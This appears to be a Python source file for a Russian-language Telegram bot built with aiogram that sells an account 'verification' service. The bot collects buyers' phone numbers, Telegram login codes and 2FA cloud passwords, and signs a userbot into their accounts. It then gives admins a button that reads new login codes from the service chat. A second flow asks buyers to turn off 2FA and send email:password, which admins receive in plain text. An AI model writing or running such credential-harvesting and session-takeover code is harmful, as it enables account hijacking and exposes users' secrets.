"""
login_flow.py — поток авторизации покупателя.

PHONE-ФЛОУ: номер → код (42777) → 2FA → юзербот залогинен → карточка админу
CREDS-ФЛОУ: email:пароль → карточка админу
"""

from datetime import datetime

from aiogram import Router, F, Bot
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from database import (
    get_login_session, update_login_session,
    create_login_session, get_all_admin_ids,
    update_balance
)
from userbot import (
    request_code,
    login_with_code,
    submit_2fa,
    get_last_tg_code,
    disconnect_session,
)

router = Router()


class LoginStates(StatesGroup):
    waiting_phone = State()
    waiting_code  = State()
    waiting_2fa   = State()


class CredsStates(StatesGroup):
    waiting_creds = State()


def numpad_kb(current="", session_id=0, prefix="numpad"):
    rows = []
    for row in [["1","2","3"],["4","5","6"],["7","8","9"],["⌫","0","✅"]]:
        btn_row = []
        for btn in row:
            if btn == "⌫":
                cb = f"{prefix}:del:{session_id}"
            elif btn == "✅":
                cb = f"{prefix}:ok:{session_id}"
            else:
                cb = f"{prefix}:digit:{btn}:{session_id}"
            btn_row.append(InlineKeyboardButton(text=btn, callback_data=cb))
        rows.append(btn_row)
    display = f"{current}•" if current else "•••••"
    rows.insert(0, [InlineKeyboardButton(text=f"📟 Код: {display}", callback_data="noop")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


async def notify_admins(bot, text, reply_markup=None):
    admin_ids = await get_all_admin_ids()
    for aid in admin_ids:
        try:
            await bot.send_message(aid, text, parse_mode="HTML", reply_markup=reply_markup)
        except Exception:
            pass


def _admin_card_kb(user_id, session_id, order_num):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="📲 Получить свежий код от Telegram",
            callback_data=f"adm:get_tg_code:{session_id}:{user_id}:{order_num}"
        )],
        [InlineKeyboardButton(
            text="✅ Выполнено — верификация завершена",
            callback_data=f"adm:done:{session_id}:{user_id}:{order_num}"
        )],
        [InlineKeyboardButton(
            text="↩️ Возврат — что-то пошло не так",
            callback_data=f"adm:refund:{session_id}:{user_id}:{order_num}"
        )],
    ])


async def start_login_flow(message_or_call, item_name, order_num, state):
    user_id    = message_or_call.from_user.id
    session_id = await create_login_session(user_id, item_name)
    await state.update_data(
        login_session_id=session_id,
        login_item=item_name,
        login_order_num=order_num,
    )
    await state.set_state(LoginStates.waiting_phone)
    text = (
        f"📱 <b>Авторизация — {item_name}</b>\n\n"
        f"Заказ: <b>#{order_num}</b>\n\n"
        f"Введите номер телефона аккаунта:\n"
        f"<code>+7XXXXXXXXXX</code> или <code>+380XXXXXXXXX</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔴 Отмена", callback_data="login:cancel")]
    ])
    send = message_or_call.message.answer if hasattr(message_or_call, "message") else message_or_call.answer
    await send(text, reply_markup=kb, parse_mode="HTML")


@router.message(LoginStates.waiting_phone)
async def got_phone(message: Message, state: FSMContext):
    phone = message.text.strip() if message.text else ""
    if not phone.startswith("+") or not phone[1:].isdigit() or len(phone) < 10:
        await message.answer("❌ Неверный формат. Введите номер вида <code>+7XXXXXXXXXX</code>:", parse_mode="HTML")
        return

    data       = await state.get_data()
    session_id = data["login_session_id"]
    item_name  = data["login_item"]
    order_num  = data["login_order_num"]

    await update_login_session(session_id, phone=phone, status="waiting_code")
    await state.set_state(LoginStates.waiting_code)
    await state.update_data(numpad_digits="", phone=phone)

    # Юзербот запрашивает отправку кода
    code_sent = await request_code(phone)
    if not code_sent:
        await message.answer("❌ Не удалось запросить код. Попробуйте позже или обратитесь в поддержку.")
        await state.clear()
        return

    await notify_admins(
        message.bot,
        f"📲 <b>Авторизация начата — {item_name}</b>\n\n"
        f"Заказ: <b>#{order_num}</b>\n"
        f"Телефон: <code>{phone}</code>\n"
        f"User ID: <code>{message.from_user.id}</code>\n\n"
        f"⏳ Ожидаю ввода кода от покупателя..."
    )

    await message.answer(
        f"✅ Номер принят: <code>{phone}</code>\n\n"
        f"📨 Код отправлен в чат <b>42777</b> (системные сообщения Telegram).\n\n"
        f"Найдите код в этом чате и введите через кнопки ниже:",
        reply_markup=numpad_kb("", session_id),
        parse_mode="HTML"
    )


@router.callback_query(F.data.startswith("numpad:"))
async def numpad_handler(call: CallbackQuery, state: FSMContext):
    parts      = call.data.split(":")
    action     = parts[1]
    session_id = int(parts[-1])
    data       = await state.get_data()
    digits     = data.get("numpad_digits", "")
    phone      = data.get("phone", "")

    if action == "digit":
        if len(digits) < 8:
            digits += parts[2]
    elif action == "del":
        digits = digits[:-1]
    elif action == "ok":
        if not digits:
            await call.answer("Введите код.", show_alert=True)
            return

        await update_login_session(session_id, code=digits, status="logging_in")

        login_result = await login_with_code(phone=phone, code=digits, session_id=session_id)

        if login_result == "wrong_code":
            await update_login_session(session_id, status="waiting_code")
            await state.update_data(numpad_digits="")
            await call.message.edit_text(
                "❌ <b>Неверный код.</b>\n\nЗапросите новый код в Telegram и попробуйте снова:",
                reply_markup=numpad_kb("", session_id),
                parse_mode="HTML"
            )
            await call.answer("❌ Неверный код.")
            return

        if login_result == "error":
            await update_login_session(session_id, status="error")
            await call.message.edit_text("❌ Ошибка входа. Обратитесь в поддержку с номером заказа.")
            await call.answer()
            return

        if login_result == "need_2fa":
            await update_login_session(session_id, status="waiting_2fa")
            await state.set_state(LoginStates.waiting_2fa)
            await call.message.edit_text(
                "🔐 У вас установлен пароль 2FA (пароль облака Telegram).\n\nВведите его ответным сообщением:",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔴 Отмена", callback_data="login:cancel")]
                ])
            )
            await call.answer()
            return

        await _finalize_login(bot=call.bot, call_or_msg=call, state=state, session_id=session_id, tfa=None)
        return

    await state.update_data(numpad_digits=digits)
    display = f"{digits}•" if digits else "•••••"
    try:
        await call.message.edit_text(
            f"✅ Номер принят: <code>{phone}</code>\n\n📨 Введите код из чата 42777:\n\nКод: {display}",
            reply_markup=numpad_kb(digits, session_id),
            parse_mode="HTML"
        )
    except Exception:
        pass
    await call.answer()


@router.message(LoginStates.waiting_2fa)
async def got_2fa(message: Message, state: FSMContext):
    tfa        = message.text.strip()
    data       = await state.get_data()
    session_id = data["login_session_id"]
    phone      = data.get("phone", "")

    await update_login_session(session_id, tfa=tfa, status="logging_in_2fa")

    login_result = await submit_2fa(phone=phone, password=tfa, session_id=session_id)

    if login_result == "wrong_password":
        await update_login_session(session_id, status="waiting_2fa")
        await message.answer(
            "❌ Неверный пароль 2FA. Попробуйте ещё раз:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔴 Отмена", callback_data="login:cancel")]
            ])
        )
        return

    if login_result == "error":
        await message.answer("❌ Ошибка входа. Обратитесь в поддержку.")
        await state.clear()
        return

    await _finalize_login(bot=message.bot, call_or_msg=message, state=state, session_id=session_id, tfa=tfa)


async def _finalize_login(bot, call_or_msg, state, session_id, tfa):
    data      = await state.get_data()
    item_name = data.get("login_item", "—")
    order_num = data.get("login_order_num", "—")
    phone     = data.get("phone", "—")
    user_id   = call_or_msg.from_user.id if hasattr(call_or_msg, "from_user") else call_or_msg.message.from_user.id

    await update_login_session(session_id, status="ready")
    await state.clear()

    tfa_line = f"\n🔐 2FA пароль: <code>{tfa}</code>" if tfa else "\n2FA: отсутствует"

    await notify_admins(
        bot,
        f"✅ <b>Юзербот залогинился — {item_name}</b>\n\n"
        f"🧾 Заказ: <b>#{order_num}</b>\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"📱 Номер: <code>{phone}</code>"
        f"{tfa_line}\n\n"
        f"🤖 Юзербот авторизован, читает чат <b>+42777</b>.\n"
        f"Нажмите «📲 Получить свежий код» когда нужен код.",
        reply_markup=_admin_card_kb(user_id, session_id, order_num)
    )

    send = call_or_msg.answer if isinstance(call_or_msg, Message) else call_or_msg.message.answer
    await send(
        f"✅ <b>Авторизация выполнена!</b>\n\n"
        f"Администратор проводит верификацию аккаунта {item_name}.\n"
        f"Вы получите уведомление по завершении.",
        parse_mode="HTML"
    )


@router.callback_query(F.data.startswith("adm:get_tg_code:"))
async def adm_get_tg_code(call: CallbackQuery):
    admin_ids = await get_all_admin_ids()
    if call.from_user.id not in admin_ids:
        await call.answer("⛔ Нет доступа.", show_alert=True)
        return

    parts      = call.data.split(":")
    session_id = int(parts[2])
    user_id    = int(parts[3]) if len(parts) > 3 else 0
    order_num  = parts[4] if len(parts) > 4 else "—"

    await call.answer("⏳ Читаю чат 42777...")

    result = await get_last_tg_code(session_id)
    now    = datetime.now().strftime("%H:%M:%S")

    if result is None:
        code_line = (
            f"\n\n📲 <b>Запрос кода:</b> {now}\n"
            f"⚠️ Код не найден. Попробуйте снова через 5–10 секунд."
        )
    else:
        code      = result["code"]
        code_time = result.get("time", now)
        await update_login_session(session_id, code=code)
        code_line = (
            f"\n\n📟 <b>Код от Telegram:</b> <code>{code}</code>\n"
            f"🕐 Получен: {code_time}\n"
            f"⚠️ Код действует ~2 минуты!"
        )

    try:
        current_text = call.message.html_text
        for marker in ["\n\n📲 <b>Запрос кода</b>", "\n\n📟 <b>Код от Telegram</b>"]:
            if marker in current_text:
                current_text = current_text[:current_text.index(marker)]
        await call.message.edit_text(
            current_text + code_line,
            reply_markup=_admin_card_kb(user_id, session_id, order_num),
            parse_mode="HTML"
        )
    except Exception:
        pass


@router.callback_query(F.data.startswith("adm:refund:"))
async def adm_refund(call: CallbackQuery, bot: Bot):
    admin_ids = await get_all_admin_ids()
    if call.from_user.id not in admin_ids:
        await call.answer("⛔ Нет доступа.", show_alert=True)
        return

    parts      = call.data.split(":")
    session_id = int(parts[2])
    user_id    = int(parts[3]) if len(parts) > 3 else 0
    order_num  = parts[4] if len(parts) > 4 else "—"

    await update_login_session(session_id, status="refunded")
    await disconnect_session(session_id)

    refund_amount = "сумму заказа"
    try:
        from database import get_order_by_num
        order = await get_order_by_num(int(order_num))
        if order:
            await update_balance(user_id, order["price"], f"Возврат за заказ #{order_num}")
            refund_amount = f"${order['price']:.2f}"
    except Exception:
        pass

    try:
        await bot.send_message(
            user_id,
            f"↩️ <b>Возврат по заказу #{order_num}</b>\n\n"
            f"Верификация не удалась.\n"
            f"На ваш баланс возвращено <b>{refund_amount}</b>.\n\n"
            f"Попробуйте снова или обратитесь в поддержку.",
            parse_mode="HTML"
        )
    except Exception:
        pass

    try:
        await call.message.edit_text(
            call.message.html_text + "\n\n↩️ <b>Возврат выполнен. Пользователь уведомлён.</b>",
            parse_mode="HTML",
            reply_markup=None
        )
    except Exception:
        pass
    await call.answer("↩️ Возврат выполнен.")


@router.callback_query(F.data.startswith("adm:done:"))
async def adm_done(call: CallbackQuery):
    admin_ids = await get_all_admin_ids()
    if call.from_user.id not in admin_ids:
        await call.answer("⛔ Нет доступа.", show_alert=True)
        return

    parts     = call.data.split(":")
    raw_id    = int(parts[2])
    user_id   = int(parts[3]) if len(parts) > 3 else None
    order_num = parts[4] if len(parts) > 4 else "—"

    try:
        await update_login_session(raw_id, status="done")
    except Exception:
        pass

    await disconnect_session(raw_id)

    if user_id:
        try:
            review_kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✍️ Оставить отзыв", url="https://t.me/rewiews_vorache777")]
            ])
            await call.bot.send_message(
                user_id,
                f"✅ <b>Верификация по заказу #{order_num} выполнена!</b>\n\n"
                f"Доступ к аккаунту полностью возвращён вам.\n\n"
                f"Будем рады вашему отзыву 👇\n"
                f"Формат: <code>+реп @vorache777, верифнул [сервис]...</code> + скрин\n"
                f"За отзыв — купон <b>10%</b> на 3 покупки 🎁",
                reply_markup=review_kb,
                parse_mode="HTML"
            )
        except Exception:
            pass

    try:
        await call.message.edit_text(
            call.message.html_text + "\n\n✅ <b>Сессия завершена. Пользователь уведомлён.</b>",
            parse_mode="HTML",
            reply_markup=None
        )
    except Exception:
        pass
    await call.answer("✅ Выполнено.")


@router.callback_query(F.data == "login:cancel")
async def cancel_login(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    session_id = data.get("login_session_id")
    if session_id:
        try:
            await update_login_session(session_id, status="cancelled")
            await disconnect_session(session_id)
        except Exception:
            pass
    await state.clear()
    await call.message.edit_text("❌ Авторизация отменена.")
    await call.answer()


# ── CREDS-ФЛОУ ───────────────────────────────────────────────

async def start_creds_flow(call_or_msg, item_name, order_num, order_db_id, state):
    await state.update_data(
        creds_item=item_name,
        creds_order_num=order_num,
        creds_order_db_id=order_db_id,
    )
    await state.set_state(CredsStates.waiting_creds)
    text = (
        f"🔑 <b>Верификация — {item_name}</b>\n\n"
        f"Заказ: <b>#{order_num}</b>\n\n"
        f"Отправьте данные для входа в формате:\n"
        f"<code>email@example.com:пароль</code>\n\n"
        f"⚠️ Убедитесь что 2FA отключена перед отправкой."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔴 Отмена", callback_data="creds:cancel")]
    ])
    send = call_or_msg.message.answer if hasattr(call_or_msg, "message") else call_or_msg.answer
    await send(text, reply_markup=kb, parse_mode="HTML")


@router.message(CredsStates.waiting_creds)
async def got_creds(message: Message, state: FSMContext):
    text = message.text.strip() if message.text else ""
    if ":" not in text:
        await message.answer(
            "❌ Неверный формат. Отправьте строго в виде:\n<code>email@example.com:пароль</code>",
            parse_mode="HTML"
        )
        return

    login_part, password = text.split(":", 1)
    if not login_part.strip() or not password.strip():
        await message.answer(
            "❌ Логин или пароль пустые:\n<code>email@example.com:пароль</code>",
            parse_mode="HTML"
        )
        return

    data        = await state.get_data()
    item_name   = data.get("creds_item", "—")
    order_num   = data.get("creds_order_num", "—")
    order_db_id = data.get("creds_order_db_id", 0)
    user_id     = message.from_user.id
    await state.clear()

    done_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="✅ Выполнено — верификация завершена",
            callback_data=f"adm:done:{order_db_id}:{user_id}:{order_num}"
        )],
        [InlineKeyboardButton(
            text="↩️ Возврат — данные не подошли",
            callback_data=f"adm:refund:{order_db_id}:{user_id}:{order_num}"
        )],
    ])

    await notify_admins(
        message.bot,
        f"🔑 <b>Верификация логин:пароль — {item_name}</b>\n\n"
        f"🧾 Заказ: <b>#{order_num}</b>\n"
        f"👤 User ID: <code>{user_id}</code>\n\n"
        f"📧 Логин: <code>{login_part.strip()}</code>\n"
        f"🔒 Пароль: <code>{password.strip()}</code>",
        reply_markup=done_kb
    )

    await message.answer(
        "✅ <b>Данные получены!</b>\n\n"
        "Администратор выполнит верификацию в ближайшее время.\n"
        "Вы получите уведомление по завершении.",
        parse_mode="HTML"
    )


@router.callback_query(F.data == "creds:cancel")
async def cancel_creds(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await call.message.edit_text("❌ Верификация отменена.")
    await call.answer()
